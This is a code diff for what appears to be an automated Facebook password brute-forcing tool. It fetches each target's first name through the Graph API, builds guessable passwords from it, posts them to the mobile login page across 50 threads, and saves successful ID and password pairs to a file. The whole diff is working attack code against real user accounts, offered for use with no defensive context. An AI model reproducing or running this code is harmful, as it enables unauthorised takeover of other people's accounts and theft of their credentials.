@@ -13,11 +13,16 @@ class AutoB:
 
 	def attk(self,idd):
 		try:
-			self.autop(idd)
+			nem=self.req.get(self.u.format(idd+'/?access_token='+self.ken))
+			js=json.loads(nem.text)
+			if ' ' in js['first_name']:
+				name=js['first_name'].split(' ')[0]
+			else:
+				name=js['first_name']
+			self.lid=[name+'123',name+'12345',name.lower()+'123',name.lower()+'12345',self.spas]
 			for x in self.lid:
-				data={'email':idd,'pass':x,'login':'submit'}
-				head={'User-Agent':'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36'}
-				re=requests.post('https://mbasic.facebook.com/login',data=data,headers=head).text
+				data={'email':idd,'pass':x}
+				re=requests.post('https://mbasic.facebook.com/login',data=data,timeout=5).text
 				if 'save-device' in re or 'm_sess' in re:
 					pen=open('result/found.txt','a')
 					pen.write(f'{idd}|{x}\n')
@@ -44,10 +49,11 @@ class AutoB:
 			self.file=open(fil,'r').read().splitlines()
 		except FileNotFoundError:
 			exit('[!] File not found')
-		tan=input('[?] Try Auto Multi BruteForce+ (longer) [y/n]: ')
+		tan=input('[?] Do you want enter extra password (y/n): ')
 		if tan == 'y' or tan == 'Y':
-			self.spas=input('[!] enter the special password leave blank for default\n[?] Special password: ')
-			self.AP=True
+			self.spas=input('[?] Extra password: ')
+		else:
+			self.spas=''
 		print()
 		p=ThreadPool(50)
 		p.map(self.attk,self.file)
@@ -58,21 +64,6 @@ class AutoB:
 			print("found result saved: result/found.txt")
 		if len(self.cek) > 0:
 			print("check result saved: result/cek.txt")
-
-	def autop(self,id):
-		try:
-			nem=self.req.get(self.u.format(id+'/?access_token='+self.ken))
-			js=json.loads(nem.text)
-			if ' ' in js['first_name']:
-				name=js['first_name'].split(' ')[0]
-			else:
-				name=js['first_name']
-			self.lid=[name+'123',name.lower()+'123']
-			if self.AP == True:
-				self.lid.append(name+'12345')
-				self.lid.append(name.lower()+'12345')
-				self.lid.append(self.spas)
-		except: pass
 try:
 	AutoB()
 except Exception as FCK:
